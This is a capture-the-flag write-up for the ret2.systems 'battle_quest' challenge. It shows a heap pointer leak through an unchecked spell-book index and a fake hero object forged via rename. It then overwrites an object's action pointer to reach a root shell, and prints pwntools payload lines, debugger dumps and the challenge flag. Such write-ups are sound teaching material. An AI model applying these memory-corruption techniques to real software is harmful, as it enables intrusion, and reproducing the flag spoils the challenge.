
This challenge was given by [ret2.systems](https://wargames.ret2.systems/level/battle_quest). You would use their own system to analyze/debug and exploit, pretty awesome.

The challenge is based on a RPG game where we have five heroes: Bard, Wizard, Rogue, Druid and a Dragon.

Each hero has four actions in a turn:

  

    ,--------[ Selected Bard ]---------
    
    | Health: 100/100
    
    |
    
    | <Turn Options>
    
    | 1) Attack (10 Power)
    
    | 2) Heal (25 Health)
    
    | 3) Special Action
    
    | 4) Rename
    
    | Choose Turn Option:
    
    >>

There are different values for attacking and healing for each hero, but the special action is where will be the attention for the challenge.

  

The Dragon is the one we need to win, its special action will execute /bin/sh.

  

> 1.  class  Dragon  :  public  Hero  {
>     
> 2.  public:
>     
> 3.  Dragon():  Hero("Dragon's Hoard",  "The dragon has a large amount of gold stored up",  500,  500,  10000000000)  {
>     
> 4.  set_name("Dragon");
>     
> 5.  }
>     
> 
> 7.  void do_action(Game* game)  {
>     
> 8.  print_gold();
>     
> 9.  system("/bin/sh");
>     
> 10.  }
>     
> 11.  };


  

If you try to beat it just playing the game, you won’t have it and the game will be finished. So let's pwn!

You will start with the Bard and fighting against the Wizard. The special action from Bard turns the enemy to an ally but the enemy needs to be with <= 10 health.


Each hero added to the fight has a pointer into the heap and at this address is found the hero’s object.

  

    wdb> x/100w 0x00000000006b5c30
    
    0x6b5c30: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5c40: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5c50: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5c60: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5c70: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5c80:  **0x006b6d00** 0x00000000 0x00000000 0x00000000
    
    0x6b5c90: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5ca0: 0x00000000 0x00000000 0x00000000 0x00000000

  
  

This is the structure of the hero’s object:

  

    wdb> x/20w 0x006b6d00
    
    0x6b6d00: 0x00607bf8 0x00000000 0x006b6e20 0x00000000
    
    0x6b6d10: 0x0000000a 0x00000000 0x00000019 0x00000000
    
    0x6b6d20: 0x00000064 0x00000000 0x006b6d38 0x00000000
    
    0x6b6d30: 0x0000000d 0x00000000 0x6973754d 0x206c6163
    
    0x6b6d40: 0x72616843 0x0000006d 0x006b6dd0 0x00000000

  

For the challenge, the most important to know is that the first QWORD is the pointer to the hero’s special action function address and then next is the pointer to the hero’s name.

  

    wdb> x/w 0x00607bf8
    
    **0x607bf8: 0x0040347a**
    
      
    
    Bard::do_action
    
    **0x40347a: push rbp**
    
    0x40347b: mov rbp, rsp
    
    0x40347e: push rbx
    
    0x40347f: sub rsp, 0x28
    
    0x403483: mov qword [rbp-0x28], rdi
    
    0x403487: mov qword [rbp-0x30], rsi
    
    0x40348b: mov rax, qword [rbp-0x30]
    
    0x40348f: mov rdi, rax
    
    0x403492: call Game::get_enemy
    
    0x403497: mov qword [rbp-0x18], rax
    
    0x40349b: mov rax, qword [rbp-0x18]
    
    0x40349f: mov rdi, rax
    
    0x4034a2: call Hero::get_health
    
    0x4034a7: cmp rax, 0xa
    
    0x4034ab: setbe al
    
    0x4034ae: test al, al
    
    0x4034b0: je 0x40354b

  

Defeat the Wizard using the attacks and use the special action for getting the Wizard when its health = 10.

  

The Wizard’s special action allows to create spells for increasing the attack and/or healing the hero.

  

    ,--------[ Selected Wizard ]---------
    
    | Health: 85/100
    
    |
    
    | <Turn Options>
    
    | 1) Attack (1 Power)
    
    | 2) Heal (35 Health)
    
    | 3) Special Action
    
    | 4) Rename
    
    | Choose Turn Option:
    
    >> 3
    
    | << Special Action: Spell Master >>
    
    | Learn or use spells
    
    | ----
    
    | Learn a new spell? [yes/no]
    
    >> yes
    
    |
    
    | Enter Spell to try:
    
    >> aa5f
    
    ,-------------------------------
    
    | Dealt 31 Damage!
    
    '-------------------------------
    
    | Save this spell in your spell book? [yes/no]
    
    >>

After creating and saving the first spell, the function allows to choose the spell and does not control the access to the array in memory (as you can see on the source code below) and consequently to read arbitrary values including heroes' pointer by inserting indexes > 10. The indexes 11 & 12 will be Bard and Wizard respectively.

  
  

> 1.  }  else  {
>     
> 2.  if  (game->get_total_spells()  >  0)  {
>     
> 3.  std::cout <<  "| Select page of spell book (1-"  << game->get_total_spells()  <<  ")"  << std::endl;
>     
> 4.  unsigned  int page;
>     
> 5.  std::cin >> page;
>     
> 6.  if  (!std::cin.good())
>     
> 7.  exit(-1);
>     
> 8.  std::cin.ignore(256,  '\n');
>     
> 
> 10.  spell = game->get_spell(page-1);

    
      
    
    wdb> x/60w 0x00000000006b5c30
    
    0x6b5c30:  0x0000aa5f 0x00000000 0x00000000 0x00000000
    
    0x6b5c40: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5c50: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5c60: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5c70: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5c80:  **0x006b6d00** 0x00000000 **0x006b6e50** 0x00000000
    
    0x6b5c90: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5ca0: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5cb0: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5cc0: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5cd0: 0x00000002 0x00000001 0x006b6f40 0x00000000
    
    0x6b5ce0: 0x00000000 0x00000000 0x00001011 0x00000000
    
    0x6b5cf0: 0x0a730a33 0x0000000a 0x00000000 0x00000000
    
    0x6b5d00: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b5d10: 0x00000000 0x00000000 0x00000000 0x00000000

  

## Leaking The Heap

  

So at this point, we could leak a heap pointer.

  

    | << Special Action: Spell Master >>
    
    | Learn or use spells
    
    | ----
    
    | Learn a new spell? [yes/no]
    
    >> no
    
    | Select page of spell book (1-1)
    
    >> 11
    
    ,~~~~~~~~~~~~~~~~~~~~~~..~~~~~~~~~~~~~~~~~~~~~~
    
     }{ SPELL ~~**6B6D00**~~
     }{
    
     SPELL BOOK }{ Attack: 0 Damage
    
     }{ Healing: 0 Health
    
    }{ Cost: 0 Health
    
    '~~~~~~~~~~~~~~~~~~~~~~''~~~~~~~~~~~~~~~~~~~~~~~
    
    | Cast this spell? [yes/no]

>>

  

The current enemy is the Rogue, no tricks to defeat only attack and heal when necessary. The Rogue has no importance to the exploitation.

  

After the Rogue, we will face the Druid. After fighting it, you will be able to collect it.

  

The Druid’s special action allows to revive an ally (set health = 100) and gives the opportunity for the revived hero to use their actions but the special one.

  

While choosing the hero to be revived, the function does the input validation from >= 0 <= 10 where the first hero (Bard) is 1.

  

> 1.  class  Druid  :  public  Hero  {
>     
> 2.  public:
>     
> 3.  Druid():  Hero("Revive","Heal selected hero by 100 and allow them to attack",  10,  30)  {
>     
> 4.  set_name("Druid");
>     
> 5.  }
>     
> 
> 7.  void do_action(Game* game)  {
>     
> 8.  std::cout <<  "| Select hero to revive:"  << std::endl;
>     
> 9.  for  (unsigned  int i=0; i < game->get_total_heroes(); i++)  {
>     
> 10.  Hero* hero = game->get_all_heroes()[i];
>     
> 11.  std::cout <<  "| "  <<  (i+1)  <<  ") "  << hero->get_name()  <<  ": "  << hero->get_health()  <<  " / 100"  << std::endl;
>     
> 12.  }

        

  

Here the second vulnerability.

  

It is possible to use the index "0" and then this will take the 10th address from the spells as a hero to be revived. So we can create a 10th spell using an address in the heap that we control such as the heroes name. So using the rename option, create a fake hero object like this:

  

fake_hero=(4*p64(0x0))+p64(dragon_data)+p64(hero_pointer)+p64(0xb)+p64(0x19)+p64(0xfff)+p64(leak+0x38)+p64(0xd)+p64(0xdeadbeef)+p64(0xdeadbeef)

  

Remember that we can't use special action on the Druid's revival turn. But since it is possible to control the entire fake hero object, we can use the 2nd QWORD on the fake hero's object (pointer to the name) and point to somewhere else.

  

    wdb> x/20w 0x00000000006b6d00
    
    0x6b6d00: 0x00607bf8 0x00000000 **0x006b6e20** 0x00000000
    
    0x6b6d10: 0x0000000a 0x00000000 0x00000019 0x00000000
    
    0x6b6d20: 0x00000046 0x00000000 0x006b6d38 0x00000000
    
    0x6b6d30: 0x0000000d 0x00000000 0x6973754d 0x206c6163
    
    0x6b6d40: 0x72616843 0x0000006d 0x006b6dd0 0x00000000
    
    wdb> x/10w **0x006b6e20**
    
    0x6b6e20: *0x64726142* 0x00000000 0x00000000 0x00000000
    
    0x6b6e30: 0x00000000 0x00000000 0x00000000 0x00000000
    
    0x6b6e40: 0x00000000 0x00000000

  

## Exploitation

  

That give us the **write > what > where exploitation** primitive.

We can set the second QWORD (pointer to the name) on the fake hero's object pointing to any hero's pointer. And then overwrite the special action's function while renaming it during the Druid's revival turn, since it is not possible to reach the fake hero during a normal turn.

  

    

    > p.sendline(p64(dragon_data))

  

That will overwrite the value 0x607bf8 (Bard's data) to 0x607b98 (Dragon's data) in the Bard's object. And then we can use the Bard's special action now replaced to the Dragon's special action and get the shell.

  

    | ----
    
    _.--.
    
    _.-'_:-'||
    
    _.-'_.-::::'||
    
    _.-:'_.-::::::' ||
    
    .'`-.-:::::::' ||
    
    /.'`;|:::::::' ||_
    
    || ||::::::' _.;._'-._
    
    || ||:::::' _.-!oo @.!-._'-.
    
    \'. ||:::::.-!()oo @!()@.-'_.|
    
    '.'-;|:.-'.&$@.& ()$%-'o.'\U||
    
    `>'-.!@%()@'@_%-'_.-o _.|'||
    
    ||-._'-.@.-'_.-' _.-o |'||
    
    ||=[ '-._.-\U/.-' o |'||
    
    || '-.]=|| |'| o |'||
    
    || || |'| _| ';
    
    || || |'| _.-'_.-'
    
    |'-._ || |'|_.-'_.-'
    
    '-._'-.|| |' `_.-'
    
    '-.||_/.-'
    
    $
    
    $ id
    
    uid=0(root) gid=0(root)
    
    $
    
    $ ls
    
    . .. flag
    
    $
    
    $ cat flag
    
    **flag{r0ll_a_p3rfec7_20}**

  

I hope you enjoyed the reading

The exploit is a mess, but you can download it [here](https://github.com/bmphx2/CTFS/blob/master/ret2systems/battle_quest/exploit.py).

I also uploaded the [source-code](https://github.com/bmphx2/CTFS/blob/master/ret2systems/battle_quest/source_code.cpp) from the binary, in case the challenge is no longer available.

